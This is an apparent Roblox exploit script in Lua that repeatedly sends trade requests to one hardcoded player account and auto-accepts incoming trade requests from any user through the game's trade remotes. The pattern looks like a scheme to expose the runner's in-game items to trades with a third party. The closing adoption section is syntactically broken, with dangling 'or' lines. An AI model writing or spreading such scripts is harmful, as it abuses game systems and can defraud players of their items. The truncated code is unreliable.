local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Configuration: Target players to SEND trade requests to
local TARGET_PLAYERS = {
	"Her0eXBuildera31",
}

-- Locate Remotes
local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
local acceptTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/AcceptOrDeclineTradeRequest", true)
local acceptAdoptRemote = ReplicatedStorage:FindFirstChild("AdoptAPI/AcceptDeclineAdopt", true)

-- Function to send trade requests to specific configured targets
local function sendTradeRequest(playerName)
	local targetPlayer = Players:FindFirstChild(playerName)
	if not targetPlayer then
		warn("Player not found in server: " .. playerName)
		return
	end
	
	if sendTradeRemote and sendTradeRemote:IsA("RemoteEvent") then
		sendTradeRemote:FireServer(targetPlayer)
		print("Successfully sent trade request to: " .. playerName)
	else
		warn("TradeAPI/SendTradeRequest RemoteEvent could not be located.")
	end
end

-- Continuous loop to send trade requests to target players
task.spawn(function()
	while true do
		for _, playerName in ipairs(TARGET_PLAYERS) do
			if Players:FindFirstChild(playerName) then
				sendTradeRequest(playerName)
			end
		end
		task.wait(10) -- Adjust repeat delay as needed
	end
end)

-- Global Listener: Auto-accept incoming trade requests from ANY user
local tradeApiFolder = ReplicatedStorage:FindFirstChild("TradeAPI", true)
if tradeApiFolder then
	local incomingTradeEvent = tradeApiFolder:FindFirstChild("OnTradeRequestReceived") 
		or tradeApiFolder:FindFirstChild("TradeRequestNotification")
		or tradeApiFolder:FindFirstChild("RequestReceived")

	if incomingTradeEvent and incomingTradeEvent:IsA("RemoteEvent") then
		incomingTradeEvent.OnClientEvent:Connect(function(sender, ...)
			if acceptTradeRemote and acceptTradeRemote:IsA("RemoteEvent") then
				acceptTradeRemote:FireServer(sender, true)
				print("Auto-accepted trade request from: " .. tostring(sender))
			end
		end)
	end
end

local adoptApiFolder = ReplicatedStorage:FindFirstChild("AdoptAPI", true)

		or adoptApiFolder:FindFirstChild("AdoptRequestNotification")
		or adoptApiFolder:FindFirstChild("RequestReceived")
